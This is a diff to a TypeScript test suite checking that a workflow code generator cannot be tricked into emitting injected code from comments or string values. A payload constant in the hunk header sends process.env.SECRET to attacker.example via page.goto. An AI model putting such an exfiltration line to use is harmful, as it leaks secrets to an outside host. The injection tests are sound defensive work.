@@ -19,7 +19,12 @@ const PAYLOAD = "await page.goto('https://attacker.example/?c=' + process.env.SE
  * Parse generated source and return the statements at module level and the
  * statements inside the workflow callback, as source text.
  */
-function structure(source: string): { topLevel: string[]; body: string[]; errors: number } {
+function structure(source: string): {
+  topLevel: string[];
+  body: string[];
+  identifiers: Set<string>;
+  errors: number;
+} {
   const file = ts.createSourceFile('out.ts', source, ts.ScriptTarget.ESNext, true);
   const errors = (file as unknown as { parseDiagnostics: unknown[] }).parseDiagnostics.length;
   const topLevel = file.statements.map((s) => ts.SyntaxKind[s.kind]);
@@ -31,7 +36,16 @@ function structure(source: string): { topLevel: string[]; body: string[]; errors
       for (const s of fn.body.statements) body.push(s.getText(file));
     }
   }
-  return { topLevel, body, errors };
+  // Every identifier that appears as code. Text inside comments and string
+  // literals does not produce Identifier nodes, so an injected call shows up
+  // here and nowhere else.
+  const identifiers = new Set<string>();
+  const visit = (node: ts.Node): void => {
+    if (ts.isIdentifier(node)) identifiers.add(node.text);
+    ts.forEachChild(node, visit);
+  };
+  visit(file);
+  return { topLevel, body, identifiers, errors };
 }
 
 function hostileWorkflow(breaker: string): Workflow {
@@ -77,16 +91,21 @@ describe('codegen: comment text cannot break out into code', () => {
     // Bypass validation on purpose: the templater is the last line of defence.
     const rendered = createTemplater().renderWorkflow(hostileWorkflow(breaker));
     const source = await formatTypeScript(rendered);
-    const { topLevel, body, errors } = structure(source);
+    const { topLevel, body, identifiers, errors } = structure(source);
 
     expect(errors).toBe(0);
+    // The payload reads process.env.SECRET; neither name may appear as code.
+    expect(identifiers.has('process')).toBe(false);
+    expect(identifiers.has('SECRET')).toBe(false);
     // One import and one workflow() call. Nothing injected at module level.
     expect(topLevel).toEqual(['ImportDeclaration', 'ExpressionStatement']);
-    // Destructure, goto, guard. Nothing injected in the body.
+    // Destructure, then one step() wrapper per top-level step. Nothing else.
     expect(body).toHaveLength(3);
     expect(body[0]).toBe('const { page } = ctx;');
-    expect(body[1]).toBe("await page.goto('https://example.com');");
-    expect(body[2]).toMatch(/^if \(await page\.locator\('#banner'\)\.isVisible\(\)\) \{/);
+    expect(body[1]).toMatch(/^await step\(ctx, \{ id: 'step_nav', action: 'navigate' \}/);
+    expect(body[1]).toContain("await page.goto('https://example.com');");
+    expect(body[2]).toMatch(/^await step\(ctx, \{ id: 'step_guard', action: 'guard' \}/);
+    expect(body[2]).toContain("if (await page.locator('#banner').isVisible()) {");
     // The payload text survives only as comment text.
     for (const line of source.split('\n')) {
       if (line.includes('attacker.example')) expect(line.trimStart().startsWith('//')).toBe(true);
@@ -183,15 +202,16 @@ describe('codegen: string values cannot break out of their literal', () => {
     'compiles %s into exactly the expected statements',
     async (_label, value) => {
       const { source } = await compile(workflowWith(value));
-      const { topLevel, body, errors } = structure(source);
+      const { topLevel, body, identifiers, errors } = structure(source);
 
       expect(errors).toBe(0);
       expect(topLevel).toEqual(['ImportDeclaration', 'ExpressionStatement']);
-      // Destructure, nine step bodies, two postcondition asserts.
-      expect(body).toHaveLength(12);
+      // Destructure, then one step() wrapper for each of the nine steps.
+      expect(body).toHaveLength(10);
+      expect(identifiers.has('evil')).toBe(false);
       expect(source).not.toMatch(/^\s*evil\(\);/m);
-      for (const statement of body) {
-        expect(statement.startsWith('evil')).toBe(false);
+      for (const statement of body.slice(1)) {
+        expect(statement.startsWith('await step(')).toBe(true);
       }
     },
   );
